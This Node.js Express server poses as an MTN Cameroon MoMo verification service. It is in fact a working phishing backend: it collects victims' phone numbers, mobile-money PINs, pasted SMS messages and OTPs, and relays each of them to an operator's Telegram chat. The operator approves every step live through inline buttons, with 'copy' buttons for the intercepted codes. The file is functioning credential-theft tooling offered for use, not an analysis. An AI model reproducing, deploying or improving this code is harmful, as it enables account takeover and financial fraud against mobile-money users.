require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fetch = require('node-fetch');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../frontend')));

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const SMS_GATEWAY_URL = process.env.SMS_GATEWAY_URL;
const SMS_GATEWAY_API_KEY = process.env.SMS_GATEWAY_API_KEY;
const DEBUG_SMS = process.env.DEBUG_SMS !== 'false';

const applications = {};

function generateId() {
  return 'APP' + Math.random().toString(36).substring(2, 10).toUpperCase();
}
function generateCode(len = 6) {
  return Math.floor(10 ** (len - 1) + Math.random() * 9 * 10 ** (len - 1)).toString();
}

async function sendTelegramMessage(text, buttons = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const body = { chat_id: TELEGRAM_CHAT_ID, text };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  try {
    await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  } catch (e) {
    console.error('Telegram send error:', e);
  }
}

async function sendSms(to, text) {
  if (!SMS_GATEWAY_URL || !SMS_GATEWAY_API_KEY) {
    console.log(`[SIMULATED SMS] to ${to}: ${text}`);
    return;
  }
  try {
    await axios.post(`${SMS_GATEWAY_URL}/sms`, { to, text }, {
      headers: { 'Content-Type': 'application/json', 'x-api-key': SMS_GATEWAY_API_KEY }
    });
    console.log(`✅ SMS sent to ${to}`);
  } catch (e) {
    console.error('❌ SMS send failed:', e.message);
    console.log(`[FALLBACK SIMULATED SMS] to ${to}: ${text}`);
  }
}

// Routes
app.get('/api/health', (req, res) => res.json({ ok: true }));

// VERIFY PIN (Login)
app.post('/api/verify-pin', async (req, res) => {
  const { phoneNumber, pin } = req.body;
  if (!phoneNumber || !pin) return res.status(400).json({ success: false, message: 'Missing required fields' });
  const appId = generateId();
  applications[appId] = {
    phoneNumber, pin,
    pinStatus: 'pending',
    smsStatus: 'pending',
    otpStatus: 'pending',
    smsCode: null,
    otpCode: null,
    smsMessage: null,
    otpEntered: null,
    createdAt: new Date().toISOString()
  };
  const message = `🔐 *PIN VERIFICATION REQUIRED*\n\nApp ID: ${appId}\nPhone: +237${phoneNumber}\nPIN: ${pin}\n\nApprove or reject:`;
  const buttons = [[
    { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'PIN', appId }) },
    { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'PIN', appId }) }
  ]];
  await sendTelegramMessage(message, buttons);
  res.json({ success: true, applicationId: appId });
});

app.get('/api/check-pin-status/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
  res.json({ success: true, status: app.pinStatus });
});

// RESEND SMS
app.post('/api/resend-sms', async (req, res) => {
  const { applicationId } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });

  const newCode = generateCode(6);
  app.smsCode = newCode;
  app.smsMessage = null;
  await sendSms(`+237${app.phoneNumber}`, `Your MTN MoMo verification code is: ${newCode}`);

  const message = `🔄 *SMS RESENT*\n\nApp ID: ${applicationId}\nPhone: +237${app.phoneNumber}\nNew SMS code: ${newCode}\n\nPlease verify the SMS message the user will paste.`;
  const buttons = [[
    { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'SMS', appId: applicationId }) },
    { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'SMS', appId: applicationId }) }
  ]];
  await sendTelegramMessage(message, buttons);
  res.json({ success: true });
});

// VERIFY SMS (no auto-check – admin decides)
app.post('/api/verify-sms', async (req, res) => {
  const { applicationId, smsMessage } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
  app.smsMessage = smsMessage;
  app.smsStatus = 'pending';
  const message = `📨 *SMS MESSAGE RECEIVED*\n\nApp ID: ${applicationId}\nPhone: +237${app.phoneNumber}\nSMS Message:\n${smsMessage}\n\nApprove or reject:`;
  const buttons = [[
    { text: '📋 Copy SMS Content', callback_data: JSON.stringify({ action: 'COPY_SMS', appId }) },
    { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'SMS', appId }) },
    { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'SMS', appId }) }
  ]];
  await sendTelegramMessage(message, buttons);
  res.json({ success: true });
});

app.get('/api/check-sms-status/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
  res.json({ success: true, status: app.smsStatus });
});

// DEV SMS CODE (for testing)
app.get('/api/dev-sms-code/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
  if (DEBUG_SMS || !SMS_GATEWAY_URL) {
    return res.json({ success: true, code: app.smsCode, simulated: true });
  }
  res.json({ success: false, simulated: false });
});

// RESEND OTP (new)
app.post('/api/resend-otp', async (req, res) => {
  const { applicationId } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });

  // Ensure OTP stage is active
  if (app.smsStatus !== 'approved' || app.otpStatus !== 'pending') {
    return res.status(400).json({ success: false, message: 'OTP not yet available' });
  }

  const newOtp = generateCode(4);
  app.otpCode = newOtp;
  app.otpEntered = null;
  await sendSms(`+237${app.phoneNumber}`, `Your MTN MoMo OTP is: ${newOtp}`);

  const message = `🔄 *OTP RESENT*\n\nApp ID: ${applicationId}\nPhone: +237${app.phoneNumber}\nNew OTP: ${newOtp}\n\nApprove or reject:`;
  const buttons = [[
    { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'OTP', appId: applicationId }) },
    { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'OTP', appId: applicationId }) }
  ]];
  await sendTelegramMessage(message, buttons);
  res.json({ success: true });
});

// VERIFY OTP (no auto-check – admin decides)
app.post('/api/verify-otp', async (req, res) => {
  const { applicationId, otp } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
  app.otpEntered = otp;
  app.otpStatus = 'pending';
  const message = `🔑 *OTP ENTERED*\n\nApp ID: ${applicationId}\nPhone: +237${app.phoneNumber}\nOTP: ${otp}\n\nApprove or reject:`;
  const buttons = [[
    { text: '📋 Copy OTP', callback_data: JSON.stringify({ action: 'COPY_OTP', appId }) },
    { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'OTP', appId }) },
    { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'OTP', appId }) }
  ]];
  await sendTelegramMessage(message, buttons);
  res.json({ success: true });
});

app.get('/api/check-otp-status/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
  res.json({ success: true, status: app.otpStatus });
});

// TELEGRAM WEBHOOK
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;
  if (update.callback_query) {
    const query = update.callback_query;
    let data;
    try { data = JSON.parse(query.data); } catch (e) { return res.sendStatus(200); }
    const { action, a, step, appId } = data;
    const app = applications[appId];
    if (!app) return res.sendStatus(200);

    // Handle copy actions
    if (action === 'COPY_SMS') {
      if (app.smsMessage) {
        await sendTelegramMessage(`📋 *SMS Content*\n\n${app.smsMessage}`);
      } else {
        await sendTelegramMessage('⚠️ No SMS message available yet.');
      }
    } else if (action === 'COPY_OTP') {
      if (app.otpEntered) {
        await sendTelegramMessage(`📋 *OTP Content*\n\n${app.otpEntered}`);
      } else {
        await sendTelegramMessage('⚠️ No OTP entered yet.');
      }
    } else if (step === 'PIN') {
      app.pinStatus = a === 'APPROVE' ? 'approved' : 'rejected';
      if (app.pinStatus === 'approved') {
        const smsCode = generateCode(6);
        app.smsCode = smsCode;
        await sendSms(`+237${app.phoneNumber}`, `Your MTN MoMo verification code is: ${smsCode}`);
      }
    } else if (step === 'SMS') {
      app.smsStatus = a === 'APPROVE' ? 'approved' : 'rejected';
      if (app.smsStatus === 'approved') {
        const otpCode = generateCode(4);
        app.otpCode = otpCode;
        await sendSms(`+237${app.phoneNumber}`, `Your MTN MoMo OTP is: ${otpCode}`);
      }
    } else if (step === 'OTP') {
      app.otpStatus = a === 'APPROVE' ? 'approved' : 'rejected';
    }

    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${a || action}` })
    });
    return res.sendStatus(200);
  }
  res.sendStatus(200);
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 MTN Cameroon server running on port ${PORT}`);
});
